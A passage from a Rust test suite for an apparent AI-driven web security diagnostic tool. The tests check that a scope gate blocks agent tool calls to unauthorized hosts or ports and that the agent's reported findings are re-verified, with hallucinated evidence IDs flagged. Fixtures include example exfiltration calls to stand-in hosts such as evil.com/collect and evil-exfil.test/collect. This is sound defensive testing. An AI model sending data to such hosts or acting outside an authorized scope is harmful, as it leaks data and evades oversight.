        let ok = serde_json::json!({"code": "urllib.request.urlopen(\"https://demo.vulnlab.local/\")"});
        assert!(decide_tool_violation(&auth, "python_repl", &ok).is_none(), "스킴 기본 443 허용");
        let ok2 = serde_json::json!({"url": "http://demo.vulnlab.local:80/x"});
        assert!(decide_tool_violation(&auth, "web_fetch", &ok2).is_none(), "명시 80 허용");
        let bad = serde_json::json!({"url": "https://demo.vulnlab.local:8443/x"});
        let v = decide_tool_violation(&auth, "web_fetch", &bad).expect("8443은 위반이어야 한다");
        assert!(v.contains("8443") && v.contains("demo.vulnlab.local"), "위반 사유에 호스트:포트 명시: {v}");
        let bad2 = serde_json::json!({"host": "10.0.0.5", "port": 22});
        assert!(decide_tool_violation(&auth, "recon_http", &bad2).is_some(), "port 키 22 위반");
        // 지시자 없으면 포트 무제한 (호스트 게이트만).
        let free = auth::AuthList { allows: vec!["demo.vulnlab.local".into()], ..Default::default() };
        assert!(decide_tool_violation(&free, "web_fetch", &bad).is_none());
        // 포트 맥락 없는 베어 호스트는 호스트 게이트만 (과잉 차단 방지).
        let bare = serde_json::json!({"hostname": "demo.vulnlab.local"});
        assert!(decide_tool_violation(&auth, "x", &bare).is_none());
    }

    /// 반응형 게이트 판정 — 인가 안이면 통과(None), 밖이면 위반 사유.
    #[test]
    fn decide_tool_violation_cases() {
        let auth = auth::AuthList {
            allows: vec!["demo.vulnlab.local".into(), "10.0.0.0/24".into()],
            denies: vec!["10.0.0.9".into()],
            ..Default::default()
        };
        let ok = serde_json::json!({"code": "urllib.request.urlopen(\"https://demo.vulnlab.local/\")"});
        assert!(decide_tool_violation(&auth, "python_repl", &ok).is_none());
        let ok2 = serde_json::json!({"host": "10.0.0.5"});
        assert!(decide_tool_violation(&auth, "recon_http", &ok2).is_none());
        let bad = serde_json::json!({"code": "requests.get('https://evil.com/collect')"});
        let v = decide_tool_violation(&auth, "python_repl", &bad).expect("위반이어야 한다");
        assert!(v.contains("evil.com"), "위반 사유에 호스트 명시: {v}");
        let denied = serde_json::json!({"url": "http://10.0.0.9/x"});
        assert!(decide_tool_violation(&auth, "web_fetch", &denied).is_some(), "deny가 이겨야 한다");
        let local = serde_json::json!({"code": "print(40 + 2)"});
        assert!(decide_tool_violation(&auth, "python_repl", &local).is_none(), "대상 없는 호출은 통과");
        let yaml = auth::AuthList { yaml: true, ..Default::default() };
        assert!(decide_tool_violation(&yaml, "python_repl", &bad).is_none(), "YAML scope는 해석 불가 — kill 없음(스킬 수준만)");
        // fail-closed: 네트워크 가능 툴 + 인자 해석 불가(Null) → 차단.
        let null = Value::Null;
        assert!(
            decide_tool_violation(&auth, "python_repl", &null).is_some(),
            "인자 없이는 대상을 확인할 수 없으므로 차단해야 한다"
        );
        assert!(
            decide_tool_violation(&auth, "bash", &null).is_some(),
            "bash 도 네트워크 도달 가능 — 해석 불가 시 차단"
        );
        assert!(
            decide_tool_violation(&auth, "read", &null).is_none(),
            "순수 로컬 툴(read)은 인자가 없어도 차단하지 않는다"
        );
    }

    /// engines.json 핀 로드 — 단일 출처 파싱 + 폴백.
    #[test]
    fn engines_pin_shapes() {
        let _g = ENV_LOCK.lock().unwrap();
        std::env::remove_var("REDCELL_ENGINES_JSON");
        let doc = engines_doc();
        assert_eq!(doc.get("schema_version").and_then(|v| v.as_u64()), Some(1));
        for (eng, key) in [("pi", "pinned"), ("pi", "min"), ("prime_agent", "pinned"), ("prime_agent", "min")] {
            let v = engine_pin(eng, key, "");
            assert!(parse_semver(&v).is_some(), "{eng}.{key} 가 시맨틱 버전이어야 한다: {v}");
        }
        assert!(pi_version_at_least(&pi_pinned_version(), &pi_min_version()));
        assert!(pi_version_at_least(&prime_pinned_version(), &prime_min_version()));
        // 오버라이드 경로가 깨졌으면 내장 핀으로 폴백한다.
        std::env::set_var("REDCELL_ENGINES_JSON", "/nonexistent-engines-xyz.json");
        assert_eq!(engine_pin("pi", "pinned", "FALLBACK"), pi_pinned_version());
        assert_ne!(pi_pinned_version(), "FALLBACK");
        std::env::remove_var("REDCELL_ENGINES_JSON");
    }

    /// prime-agent 실측 이벤트 그대로의 위반 판정 — 실바이너리 캡처 verbatim 픽스처.
    #[test]
    fn decide_tool_violation_prime_fixture() {
        // prime-agent 0.10.0 --mode json 실측 tool_execution_start 전문verbatim.
        let ev = serde_json::json!({
            "type": "tool_execution_start", "toolCallId": "call_9",
            "toolName": "python_repl",
            "args": {"code": "import urllib.request; print(urllib.request.urlopen(\"http://evil-exfil.test/collect\", timeout=10).status)"}
        });
        let auth = auth::AuthList { allows: vec!["demo.vulnlab.local".into()], ..Default::default() };
        let v = decide_tool_violation(&auth, "python_repl", &ev["args"]).expect("미인가 호스트는 위반");
        assert!(v.contains("evil-exfil.test"), "{v}");
    }

    /// 스코프 스킬 생성 — prime-agent --skill 주입용 SKILL.md (frontmatter + scope).
    #[test]
    fn write_scope_skill_shape() {
        let dir = std::env::temp_dir().join(format!("rc-skill-{}", std::process::id()));
        let p = write_scope_skill(&dir, &["demo.vulnlab.local".into(), "10.0.0.0/24".into()], &["10.0.0.9".into()], None).unwrap();
        let text = std::fs::read_to_string(&p).unwrap();
        assert!(text.starts_with("---\nname: redcell-scope\n"), "frontmatter 필요:\n{text}");
        assert!(text.contains("demo.vulnlab.local") && text.contains("10.0.0.0/24"), "허용 목록 포함");
        assert!(text.contains("10.0.0.9"), "제외 목록 포함");
        assert!(text.contains("python_repl"), "prime 도구 안내 포함");
        std::fs::remove_dir_all(&dir).ok();
        // ports 지시자 반영.
        let dir2 = std::env::temp_dir().join(format!("rc-skill-p-{}", std::process::id()));
        let p2 = write_scope_skill(&dir2, &["demo.vulnlab.local".into()], &[], Some(&[80, 443])).unwrap();
        let text2 = std::fs::read_to_string(&p2).unwrap();
        assert!(text2.contains("80") && text2.contains("443"), "인가 포트 명시:\n{text2}");
        std::fs::remove_dir_all(&dir2).ok();
    }

    /// prime-agent 실행 인자 — 바이너리+--mode json+--print+--skill+--session-dir.
    #[test]
    fn prime_run_args_shape() {
        let _g = ENV_LOCK.lock().unwrap();
        let saved = std::env::var_os("REDCELL_PRIME_BIN");
        let fake = std::env::temp_dir().join(format!("prime-bin-{}", std::process::id()));
        std::fs::write(&fake, "#!/bin/sh\necho prime\n").unwrap();
        std::env::set_var("REDCELL_PRIME_BIN", &fake);
        let settings = Settings::default();
        let skill = PathBuf::from("/tmp/x/SKILL.md");
        let sdir = PathBuf::from("/tmp/x/sess");
        let (prog, args) = prime_run_args(&settings, "openai", &skill, &sdir, true, "진단해줘".into()).unwrap();
        assert_eq!(prog, fake);
        let joined = args.join(" ");
        for frag in ["--mode", "json", "--print", "--offline", "--skill", "/tmp/x/SKILL.md", "--session-dir", "/tmp/x/sess", "--continue", "--provider", "openai"] {
            assert!(args.iter().any(|a| a == frag), "인자 누락: {frag}\n전체: {joined}");
        }
        assert!(args.iter().any(|a| a == "진단해줘"), "지시문 포함: {joined}");
        // --continue 없음 (새 세션).
        let (_, args2) = prime_run_args(&settings, "openai", &skill, &sdir, false, "x".into()).unwrap();
        assert!(!args2.iter().any(|a| a == "--continue"), "새 세션에 --continue 금지");
        std::fs::remove_file(&fake).ok();
        match saved {
            Some(v) => std::env::set_var("REDCELL_PRIME_BIN", v),
            None => std::env::remove_var("REDCELL_PRIME_BIN"),
        }
    }

    /// 자율 병합 — env on + merge 태그에만 --autonomous 게이트를 붙인다.
    #[test]
    fn prime_autonomous_gate_shape() {
        let _g = ENV_LOCK.lock().unwrap();
        assert!(is_merge_run_tag("abc-merge") && is_merge_run_tag("abc-merge-early"));
        assert!(!is_merge_run_tag("abc-w1") && !is_merge_run_tag("prime"));
        // 게이트 스크립트 내용.
        let base = std::env::temp_dir().join(format!("rc-gate-{}", std::process::id()));
        let sdir = base.join("sess").join("merge");
        let gate = write_collector_gate(&sdir).expect("게이트 기록");
        let body = std::fs::read_to_string(&gate).unwrap();
        assert!(body.contains("report.md") && body.contains("grep -q"), "{body}");
        // 게이트 동작 — report.md 없으면 실패, 있으면 통과.
        let run = |r: &str| {
            std::process::Command::new("sh")
                .arg(&gate)
                .output()
                .map(|o| (o.status.success(), r.to_string()))
        };
        assert!(!run("").unwrap().0, "report.md 없으면 게이트 실패");
        std::fs::write(sdir.join("work").join("report.md"), "## R\nbody\n").unwrap();
        assert!(run("").unwrap().0, "report.md 있으면 게이트 통과");
        // 인자 조립 — env on + merge 태그.
        let saved_bin = std::env::var_os("REDCELL_PRIME_BIN");
        let saved_auto = std::env::var_os("REDCELL_PRIME_AUTONOMOUS");
        let fake = std::env::temp_dir().join(format!("prime-bin-auto-{}", std::process::id()));
        std::fs::write(&fake, "#!/bin/sh\necho prime\n").unwrap();
        std::env::set_var("REDCELL_PRIME_BIN", &fake);
        std::env::set_var("REDCELL_PRIME_AUTONOMOUS", "1");
        let settings = Settings::default();
        let skill = PathBuf::from("/tmp/x/SKILL.md");
        let mdir = base.join("sess").join("merge");
        let (_, args) = prime_run_args(&settings, "openai", &skill, &mdir, false, "x".into()).unwrap();
        let joined = args.join(" ");
        for frag in ["--autonomous", "--autonomous-max-turns", "6", "--autonomous-gate"] {
            assert!(args.iter().any(|a| a == frag), "자율 인자 누락: {frag}\n{joined}");
        }
        assert!(args.iter().any(|a| a.ends_with("gate.sh")), "게이트 경로 포함: {joined}");
        // 워커 태그에는 붙지 않는다.
        let wdir = base.join("sess").join("w1");
        let (_, args2) = prime_run_args(&settings, "openai", &skill, &wdir, false, "x".into()).unwrap();
        assert!(!args2.iter().any(|a| a == "--autonomous"), "워커에 자율 금지");
        // env off 면 merge 에도 붙지 않는다.
        std::env::remove_var("REDCELL_PRIME_AUTONOMOUS");
        let (_, args3) = prime_run_args(&settings, "openai", &skill, &mdir, false, "x".into()).unwrap();
        assert!(!args3.iter().any(|a| a == "--autonomous"), "기본 off");
        // 복원.
        std::fs::remove_file(&fake).ok();
        std::fs::remove_dir_all(&base).ok();
        match saved_bin {
            Some(v) => std::env::set_var("REDCELL_PRIME_BIN", v),
            None => std::env::remove_var("REDCELL_PRIME_BIN"),
        }
        match saved_auto {
            Some(v) => std::env::set_var("REDCELL_PRIME_AUTONOMOUS", v),
            None => std::env::remove_var("REDCELL_PRIME_AUTONOMOUS"),
        }
    }

    /// prime-agent models.json 경로 — ~/.prime/agent/models.json.
    #[test]
    fn prime_models_json_path_shape() {
        let _g = ENV_LOCK.lock().unwrap();
        let saved = [("HOME", std::env::var_os("HOME")), ("USERPROFILE", std::env::var_os("USERPROFILE"))];
        std::env::set_var("HOME", "/tmp/fakehome");
        std::env::remove_var("USERPROFILE");
        let p = prime_models_json_path().unwrap();
        assert_eq!(p, PathBuf::from("/tmp/fakehome/.prime/agent/models.json"), "{p:?}");
        for (k, v) in saved {
            match v {
                Some(v) => std::env::set_var(k, v),
                None => std::env::remove_var(k),
            }
        }
    }

    /// 프로바이더 API 호스트 — conn.base_url 우선, 없으면 카탈로그 기본값.
    #[test]
    fn provider_api_host_prefers_custom_base() {
        let settings = Settings::default();
        assert_eq!(provider_api_host("anthropic", &settings).as_deref(), Some("api.anthropic.com"));
        assert_eq!(provider_api_host("openai", &settings).as_deref(), Some("api.openai.com"));
        assert_eq!(provider_api_host("no-such", &settings), None);
        let mut s2 = Settings::default();
        s2.providers.insert(
            "custom".into(),
            ProviderConn { api_key: String::new(), base_url: "http://llm.local:8080/v1".into(), model: "x".into(), api: String::new() },
        );
        assert_eq!(provider_api_host("custom", &s2).as_deref(), Some("llm.local"));
    }

    /// ALLOW/DENY 스펙 조립 — 중복 제거·쓰레기 제거·deny 분리.
    #[test]
    fn netfilter_spec_shape() {
        let allows = vec!["10.0.0.0/8".to_string(), " Example.COM ".to_string(), "".to_string(), "http://x/".to_string()];
        let denies = vec!["10.9.9.9".to_string()];
        let extra = vec!["example.com".to_string(), "api.anthropic.com".to_string()];
        let (allow, deny) = build_netfilter_spec(&allows, &denies, &extra);
        assert_eq!(allow, "10.0.0.0/8,Example.COM,api.anthropic.com");
        assert_eq!(deny, "10.9.9.9");
    }

    /// .so 탐색 — 명시 override 가 깨졌으면 폴백 없이 None (은폐 방지).
    #[test]
    fn netfilter_so_override_broken_is_none() {
        let _g = ENV_LOCK.lock().unwrap();
        let saved = std::env::var_os("REDCELL_NETFILTER_SO");
        std::env::set_var("REDCELL_NETFILTER_SO", "/nonexistent-nf-xyz.so");
        assert_eq!(netfilter_so_path(), None);
        match saved {
            Some(v) => std::env::set_var("REDCELL_NETFILTER_SO", v),
            None => std::env::remove_var("REDCELL_NETFILTER_SO"),
        }
    }

    /// 발견 키 추출 — 등급 줄만 정규화·순서 유지·중복 제거.
    /// `##` 소제목은 매 라운드 새로 찍혀 수렴 판정을 깨뜨리므로 세지 않는다
    /// (무조건 3라운드 완주 회귀 방지).
    #[test]
    fn finding_keys_normalize_and_dedup() {
        let text = "## 워커 발견 (W1·정찰 표면 정찰)\n- [중간] 보안 헤더 누락 — CSP 없음 / 근거: 헤더 원문\n- [중간] 보안 헤더 누락 — CSP 없음 / 근거: 헤더 원문\n잡담 줄은 무시된다\n* [높음] .env 노출 — 키 확인\n## 0. 한눈에 보기\n## 추가 발견";
        let keys = extract_finding_keys(text);
        assert_eq!(keys.len(), 2, "{keys:?}");
        assert!(keys[0].contains("보안헤더누락"));
        assert!(keys[1].contains("env노출"));
    }

    /// 발행 파일명 규칙: {session_id}_{tag}_{ts}.md — 세션 묶음·차수·시각 파싱.
    #[test]
    fn report_filename_roundtrip() {
        let (sid, tag, ts) = parse_report_filename("550e8400-e29b-41d4-a716-446655440000_early_1761440000.md").unwrap();
        assert_eq!(sid, "550e8400-e29b-41d4-a716-446655440000");
        assert_eq!(tag, "early");
        assert_eq!(ts, 1761440000);
        assert!(parse_report_filename("550e8400_final_1761440000.md").is_some());
        // 수동 저장·이상한 이름은 별도 묶음(manual)으로 간다.
        assert!(parse_report_filename("20251026-120000-report.md").is_none());
        assert!(parse_report_filename("abc_final_notats.md").is_none());
        assert!(parse_report_filename("abc_final_123.html").is_none());
        assert!(parse_report_filename("nope.md").is_none());
    }

    /// 발행 저장 — 같은 세션·태그에 동일 내용이면 파일을 늘리지 않고 재사용한다.
    #[test]
    fn report_file_write_dedups_identical() {
        let dir = std::env::temp_dir().join(format!("redcell-rf-{}-{}", std::process::id(), Utc::now().timestamp_nanos_opt().unwrap_or(0)));
        let _ = fs::remove_dir_all(&dir);
        let a = write_report_file(&dir, "sess-1", "final", "REPORT-A").unwrap();
        let b = write_report_file(&dir, "sess-1", "final", "REPORT-A").unwrap();
        assert_eq!(a, b, "동일 내용은 같은 파일 재사용");
        let c = write_report_file(&dir, "sess-1", "final", "REPORT-B").unwrap();
        assert_ne!(a, c, "다른 내용은 새 파일");
        let n = fs::read_dir(&dir).unwrap().count();
        assert_eq!(n, 2, "파일은 2개여야 한다");
        let _ = fs::remove_dir_all(&dir);
    }

    /// 시작 시 채우기 — 발행 표식 기록만 파일로 만들고, 자질구레한 기록은 건너뛴다.
    /// 두 번째 실행부터는 새로 쓸 게 없어 0을 돌려준다(멱등).
    #[test]
    fn backfill_saves_only_tagged_reports() {
        let base = std::env::temp_dir().join(format!("redcell-bf-{}-{}", std::process::id(), Utc::now().timestamp_nanos_opt().unwrap_or(0)));
        let sessions = base.join("sessions");
        let reports = base.join("reports");
        fs::create_dir_all(&sessions).unwrap();
        let sess = serde_json::json!({
            "id": "sess-9", "name": "n", "host": "h", "port": null, "goal": "", "provider": "",
            "mode": "tools", "max": false, "diag": true, "deep": true, "engine": "pi",
            "auth_cookie": "", "danger_consent": false, "danger_consented_at": "", "piq": "",
            "status": "done", "created_at": "", "updated_at": "", "chat": [],
            "events": [
                { "_seq": 0, "type": "text_end", "text": "pong" },
                { "_seq": 1, "type": "note", "text": "# 1차 리포트 본문", "report": "early" },
                { "_seq": 2, "type": "note", "text": "# 최종 리포트 본문", "report": "final" },
                { "_seq": 3, "type": "note", "text": "" , "report": "final" },
            ]
        });
        fs::write(sessions.join("sess-9.json"), serde_json::to_string(&sess).unwrap()).unwrap();
        assert_eq!(backfill_reports_in_dir(&sessions, &reports), 2);
        assert_eq!(fs::read_dir(&reports).unwrap().count(), 2);
        assert_eq!(backfill_reports_in_dir(&sessions, &reports), 0, "두 번째는 새로 쓸 게 없다");
        let _ = fs::remove_dir_all(&base);
    }

    /// 이벤트 저장소(NDJSON) — write→read 왕복과 빈 파일·빈 줄 내성.
    #[test]
    fn events_ndjson_roundtrip() {
        let base = std::env::temp_dir().join(format!(
            "redcell-ev-{}-{}",
            std::process::id(),
            Utc::now().timestamp_nanos_opt().unwrap_or(0)
        ));
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).unwrap();
        let p = base.join("s1.events.ndjson");
        assert!(read_events_file(&p).is_empty(), "없는 파일은 빈 목록");
        let evs = vec![
            json!({ "_seq": 0, "type": "note", "text": "첫째" }),
            json!({ "_seq": 1, "type": "note", "text": "둘째" }),
        ];
        write_events_file(&p, &evs);
        let got = read_events_file(&p);
        assert_eq!(got.len(), 2);
        assert_eq!(got[1]["text"], "둘째");
        // NDJSON 형식 자체 검증 — 한 줄에 한 건.
        let txt = fs::read_to_string(&p).unwrap();
        assert_eq!(txt.lines().count(), 2);
        let _ = fs::remove_dir_all(&base);
    }

    /// 구버전 세션 JSON(embed events) + NDJSON 병용 — backfill 이 양쪽을 모두 읽는다.
    #[test]
    fn backfill_reads_legacy_embed_and_ndjson() {
        let base = std::env::temp_dir().join(format!(
            "redcell-bf2-{}-{}",
            std::process::id(),
            Utc::now().timestamp_nanos_opt().unwrap_or(0)
        ));
        let _ = fs::remove_dir_all(&base);
        let sessions = base.join("sessions");
        let reports = base.join("reports");
        fs::create_dir_all(&sessions).unwrap();
        fs::create_dir_all(&reports).unwrap();
        // 구버전: 이벤트가 세션 JSON 에 embed.
        let legacy = json!({
            "id": "sess-old", "name": "구버전", "host": "h", "created_at": "t", "updated_at": "t",
            "events": [
                { "_seq": 0, "type": "note", "text": "# 임베드 리포트", "report": "final" },
            ]
        });
        fs::write(sessions.join("sess-old.json"), serde_json::to_string(&legacy).unwrap()).unwrap();
        // 신버전: 이벤트가 NDJSON.
        let fresh = json!({
            "id": "sess-new", "name": "신버전", "host": "h", "created_at": "t", "updated_at": "t"
        });
        fs::write(sessions.join("sess-new.json"), serde_json::to_string(&fresh).unwrap()).unwrap();
        write_events_file(
            &sessions.join("sess-new.events.ndjson"),
            &[json!({ "_seq": 0, "type": "note", "text": "# NDJSON 리포트", "report": "final" })],
        );
        assert_eq!(backfill_reports_in_dir(&sessions, &reports), 2, "embed+ndjson 모두 발행");
        let _ = fs::remove_dir_all(&base);
    }

    /// 경로 열기 — 보고서 폴더 안의 파일만 허용하고, 바깥은 거부한다.
    #[test]
    fn open_target_validates_inside_root() {
        let root = std::env::temp_dir().join(format!("redcell-open-{}-{}", std::process::id(), Utc::now().timestamp_nanos_opt().unwrap_or(0)));
        let _ = fs::remove_dir_all(&root);
        fs::create_dir_all(root.join("reports")).unwrap();
        let inside = root.join("reports").join("a_final_1.md");
        fs::write(&inside, "x").unwrap();
        let (prog, args) = resolve_open_target(&root, inside.to_str().unwrap(), "open").unwrap();
        assert!(!prog.is_empty() && !args.is_empty());
        let (rprog, rargs) = resolve_open_target(&root, inside.to_str().unwrap(), "reveal").unwrap();
        assert!(!rprog.is_empty() && !rargs.is_empty());
        // 존재하지 않는 경로·루트 바깥 경로는 거부.
        assert!(resolve_open_target(&root, root.join("reports").join("missing.md").to_str().unwrap(), "open").is_err());
        let outside = std::env::temp_dir().join(format!("redcell-outside-{}", std::process::id()));
        fs::write(&outside, "x").unwrap();
        assert!(resolve_open_target(&root, outside.to_str().unwrap(), "open").is_err());
        let _ = fs::remove_dir_all(&root);
        let _ = fs::remove_file(&outside);
    }

    /// stderr 표시 여부 — 엔진 내부 소음(머지용 세션 자동 생성·지원 종료 경고)은
    /// 사용자 로그에 올리지 않는다. 진짜 오류·경고는 그대로 보인다.
    #[test]
    fn stderr_engine_noise_filtered() {
        // 단발성 머지 세션 자동 생성 — 매 진단마다 나오는 정상 소음.
        assert!(!stderr_line_visible(
            "Warning: No project session found with id 'rc-bd6baa08-merge'; creating a new session with that id."
        ));
        assert!(!stderr_line_visible("npm warn deprecated inflight@1.0.6"));
        assert!(!stderr_line_visible(""));
        assert!(!stderr_line_visible("   "));
        // 진짜 문제는 보여야 한다.
        assert!(stderr_line_visible("Error: 401 Unauthorized"));
        assert!(stderr_line_visible("[model] request failed: timeout"));
        // 워커 연속 세션의 자동 생성 경고는 맥락 유실 신호라 남긴다.
        assert!(stderr_line_visible(
            "Warning: No project session found with id 'rc-bd6baa08-w2'; creating a new session with that id."
        ));
    }

    /// 추가 확인 지시문 — 차수·자가 요약·엇갈린 단서·추가 발견 형식 포함.
    /// 1차 리포트용 출력 병합 — 최종 병합과 동일한 규칙(분야당 6000자·빈 분야
    /// 플레이스홀더·라운드 표기)이어야 두 리포트가 같은 품질로 나온다.
    #[test]
    fn combine_worker_outputs_shape() {
        let mut accum = std::collections::HashMap::new();
        accum.insert("w1".to_string(), "발견 A".to_string());
        accum.insert("w2".to_string(), "x".repeat(9000));
        let (combined, ok_n) = combine_worker_outputs(&accum, 1);
        assert_eq!(ok_n, 2, "내용 있는 분야만 계수");
        assert!(combined.contains("발견 A"), "w1 내용: {combined}");
        assert!(combined.contains("[1차]"), "라운드 표기: {combined}");
        assert!(combined.contains("결과를 내지 못했습니다"), "빈 분야 플레이스홀더: {combined}");
        let w2sec = combined.split("\n\n--- ").find(|s| s.starts_with("입력값 점검")).unwrap_or("");
        assert!(w2sec.chars().count() <= 6000 + 200, "분야당 6000자 절단: {}자", w2sec.chars().count());
    }

    /// 1차 리포트 병합 지시문은 같은 본문에 1차 단계 고지만 덧붙인다 —
    /// 결과 탭에서 1차/최종을 구분하는 표식이다.
    #[test]
    fn early_merge_instruction_marks_preliminary() {
        let inst = early_merge_instruction("BASE".to_string());
        assert!(inst.starts_with("BASE"), "본문 보존");
        assert!(inst.contains("1차 리포트"), "1차 표기: {inst}");
    }

    /// 부분 성공 판정 — 게이트웨이가 응답 말미를 자르면 pi 는 stopReason=error
    /// ("Response incomplete without a provider reason")를 내지만, 이미 받은
    /// 수천 자 리포트는 발행해야 한다. 짧은 텍스트·사용자 중지는 살리지 않는다.
    #[test]
    fn usable_text_salvages_truncated_report() {
        let mut o = PumpOutcome { failed: true, ..Default::default() };
        o.text = "x".repeat(600);
        assert!(has_usable_text(&o), "말미 절단 + 충분한 텍스트 = 발행");
        o.text = "짧음".to_string();
        assert!(!has_usable_text(&o), "짧은 텍스트는 살리지 않는다");
        o.text = "x".repeat(600);
        o.aborted = true;
        assert!(!has_usable_text(&o), "사용자 중지는 살리지 않는다");
    }

    #[test]
    fn followup_instruction_shape() {
        let def = &DEEP_WORKERS[2];
        let inst = deep_followup_instruction(def, 2, "- [높음] IDOR 신호", "- [단서:w2] sqli", "http://t/", "");
        assert!(inst.contains("추가 확인 2차"));
        assert!(inst.contains("로그인·권한 점검"));
        assert!(inst.contains("IDOR"));
        assert!(inst.contains("## 추가 발견"));
        assert!(inst.contains("web_fetch"));
        // prime 치환 후에도 골격 유지.
        let pa = prime_adapt(inst);
        assert!(pa.contains("python_repl+urllib") && pa.contains("## 추가 발견"));
    }

    #[test]
    fn evidence_claim_extraction_shapes() {
        let text = "### 루트 1 — .env 노출\n진입점: http://t/.env\n검증: [실증] 재현됨\n증거: **SECRET_KEY=abcd1234efgh5678** 설정값이 그대로 노출되었다\n\n### 루트 2 — 가정 시나리오\n증거: [가정] 관리자일 것이다\n";
        let claims = extract_evidence_claims(text);
        assert_eq!(claims.len(), 1, "실증+URL+발췌 1건만: {claims:?}");
        assert_eq!(claims[0].url, "http://t/.env");
        assert!(claims[0].excerpt.contains("SECRET_KEY="), "마크다운 제거: {}", claims[0].excerpt);
        // 워커 불릿 형식.
        let w = "- [높음] .env 노출 http://t/.env — 키 확인 / 근거: SECRET_KEY=abcd1234efgh5678 설정값이 그대로 노출되었다\n- [정보] 이상 없음 — 범위 확인\n";
        let wc = extract_evidence_claims(w);
        assert_eq!(wc.len(), 1, "워커 불릿 1건: {wc:?}");
        // P-ID.
        assert_eq!(extract_p_ids("인용 [P-001] 과 [P-042] 중복 [P-001]"), vec!["[P-001]".to_string(), "[P-042]".to_string()]);
        let valid: HashSet<String> = ["[P-001]".to_string()].into_iter().collect();
        assert_eq!(unknown_p_ids("인용 [P-001] 과 [P-999]", &valid), vec!["[P-999]".to_string()]);
        // 발췌 판정.
        assert!(excerpt_matches("aaa SECRET_KEY=abcd1234efgh5678 설정값이 그대로 노출됨 bbb", "", "secret_key=abcd1234efgh5678 설정값이 그대로"));
        assert!(!excerpt_matches("전혀 다른 본문 내용입니다 여기에", "", "secret_key=abcd1234efgh5678 설정값이 그대로"));
        assert!(!excerpt_matches("짧음", "", "짧음"), "20자 미만은 false");
    }

    /// 루트에 URL 이 둘 이상(진입점 + 재현 curl)이어도 하나만 재요청해
    /// 오등급(사실인 [실증] 이 [징후] 로 내려가는 일)이 없어야 한다.
    #[test]
    fn verify_tries_alternative_urls_before_downgrading() {
        use std::io::{Read, Write};
        use std::net::TcpListener;
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        thread::spawn(move || {
            for stream in listener.incoming().take(6) {
                let Ok(mut s) = stream else { break };
                let mut buf = [0u8; 2048];
                let Ok(n) = s.read(&mut buf) else { break };
                let req = String::from_utf8_lossy(&buf[..n]);
                let path = req.split_whitespace().nth(1).unwrap_or("/").to_string();
                // 첫 URL(진입점)은 다른 본문, 두 번째 URL(재현)만 증거를 담는다.
                let body = if path.starts_with("/repro") {
                    "SECRET_KEY=abcd1234efgh5678 설정값이 그대로 노출되었다"
                } else {
                    "평범한 페이지 본문입니다"
                };
                let _ = s.write_all(format!("HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}", body.len()).as_bytes());
            }
        });
        let auth = auth::AuthList { allows: vec!["127.0.0.1".into()], ..Default::default() };
        let evidence: HashMap<String, String> =
            [("[P-001]".to_string(), "medium".to_string())].into_iter().collect();
        let text = format!(
            "### 루트 1 — .env [P-001]\n진입점: http://127.0.0.1:{port}/home\n재현: curl 'http://127.0.0.1:{port}/repro'\n검증: [실증]\n증거: SECRET_KEY=abcd1234efgh5678 설정값이 그대로 노출되었다\n"
        );
        let rep = verify_report_claims(&text, &evidence, &auth, "");
        assert_eq!(rep.checks.len(), 1, "{rep:?}");
        assert!(
            matches!(rep.checks[0].verdict, ClaimVerdict::Confirmed),
            "후보 URL 중 하나가 재현되면 확인 유지: {:?}",
            rep.checks[0].verdict
        );
    }

    /// 스텁 서버 대조 — 확인/불일치/인가밖/환각P-ID 전 경로.
    #[test]
    fn verify_report_claims_against_stub() {
        use std::io::{Read, Write};
        use std::net::TcpListener;
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        thread::spawn(move || {
            for stream in listener.incoming().take(4) {
                let Ok(mut s) = stream else { break };
                let mut buf = [0u8; 2048];
                let Ok(n) = s.read(&mut buf) else { break };
                let req = String::from_utf8_lossy(&buf[..n]);
                let path = req.split_whitespace().nth(1).unwrap_or("/").to_string();
                let body = if path.starts_with("/env") {
                    "SECRET_KEY=abcd1234efgh5678 설정값이 그대로 노출되었다"
                } else {
                    "평범한 홈페이지 본문입니다"
                };
                let _ = s.write_all(format!("HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}", body.len()).as_bytes());
            }
        });
        let auth = auth::AuthList { allows: vec!["127.0.0.1".into()], ..Default::default() };
        let evidence: HashMap<String, String> =
            [("[P-001]".to_string(), "medium".to_string())].into_iter().collect();
        let text = format!(
            "### 루트 1 — .env [P-001]\n진입점: http://127.0.0.1:{port}/env\n검증: [실증]\n증거: SECRET_KEY=abcd1234efgh5678 설정값이 그대로 노출되었다\n\n### 루트 2 — 가짜 [P-999]\n진입점: http://127.0.0.1:{port}/home\n검증: [실증]\n증거: SECRET_KEY=abcd1234efgh5678 설정값이 그대로 노출되었다\n\n### 루트 3 — 외부\n진입점: http://evil.test/x\n검증: [실증]\n증거: SECRET_KEY=abcd1234efgh5678 설정값이 그대로 노출되었다\n"
        );
        let rep = verify_report_claims(&text, &evidence, &auth, "");
        assert_eq!(rep.checks.len(), 3, "{rep:?}");
        assert!(matches!(rep.checks[0].verdict, ClaimVerdict::Confirmed), "{:?}", rep.checks[0].verdict);
        assert!(matches!(rep.checks[1].verdict, ClaimVerdict::Mismatch(_)), "{:?}", rep.checks[1].verdict);
        assert!(matches!(rep.checks[2].verdict, ClaimVerdict::Skipped(_)), "{:?}", rep.checks[2].verdict);
        assert_eq!(rep.unknown_ids, vec!["[P-999]".to_string()]);
        let block = verify_report_block(&rep);
        assert!(block.contains("기계 대조 결과") && block.contains("환각 P-ID"), "{block}");
        assert!(verify_note_line(&rep).contains("주장 3건"));
    }

    #[test]
    fn verify_skips_disallowed_port() {
        use std::net::TcpListener;
        // 포트만 예약 (서빙 안 함 — 게이트가 먼저 걸러 재요청이 나가면 안 된다).
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let auth = auth::AuthList {
            allows: vec!["127.0.0.1".into()],
            ports: Some(vec![1]),
            ..Default::default()
        };
        let evidence: HashMap<String, String> =
            [("[P-001]".to_string(), "medium".to_string())].into_iter().collect();
        let text = format!(
            "### 루트 1 — x [P-001]\n진입점: http://127.0.0.1:{port}/env\n검증: [실증]\n증거: SECRET_KEY=abcdef0123456789 설정값 노출\n"
        );
        let rep = verify_report_claims(&text, &evidence, &auth, "");
